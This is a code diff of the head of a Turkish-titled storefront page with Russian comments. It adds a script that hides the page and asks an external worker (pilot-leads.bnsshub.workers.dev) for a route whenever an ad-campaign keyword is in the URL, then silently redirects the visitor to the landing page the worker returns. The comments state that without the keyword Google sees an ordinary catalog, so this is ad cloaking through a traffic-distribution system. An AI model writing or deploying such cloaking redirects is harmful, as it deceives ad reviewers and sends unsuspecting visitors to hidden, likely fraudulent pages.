@@ -7,14 +7,24 @@
 <title>Üretici mağazası</title>
 <script>
 // Старый формат ссылок кампаний (как у index.php): корень домена + ?keyword=&geosuffix=&gclid=.
-// Render статику не исполняет, поэтому переброс делает сама страница: весь query уходит в /go
-// воркера, тот спрашивает ZTDS и редиректит на лендинг. Стоит в <head> до стилей — каталог не
-// успевает отрисоваться. Без keyword в адресе ничего не происходит: Google видит обычный каталог.
+// Render статику не исполняет, поэтому маршрут спрашиваем у воркера и переходим САМИ, оставаясь
+// на текущем домене: сайт можно положить на любой хостинг и привязать свой домен (09.09).
+// Без keyword в адресе ничего не происходит — Google видит обычный каталог.
 (function(){try{
   var q=location.search; if(!q) return;
   var p=new URLSearchParams(q);
   if(!(p.get('keyword')||p.get('kw'))) return;
-  location.replace('https://pilot-leads.bnsshub.workers.dev/go'+q);
+  var el=document.documentElement, done=false;
+  el.style.visibility='hidden';                       // каталог не мелькает, пока ждём ответ
+  var show=function(){ if(!done){ done=true; el.style.visibility=''; } };
+  setTimeout(show,2500);
+  fetch('https://pilot-leads.bnsshub.workers.dev/route'+q+'&page='+encodeURIComponent(location.href),{credentials:'omit'})
+    .then(function(r){return r.json();})
+    .then(function(j){
+      if(done) return;
+      if(j&&j.path){ done=true; location.replace(j.path+(j.cid?'?cid='+encodeURIComponent(j.cid):'')); }
+      else show();
+    }).catch(show);
 }catch(e){}})();
 </script>
 <link rel="icon" type="image/png" href="favicon.png">
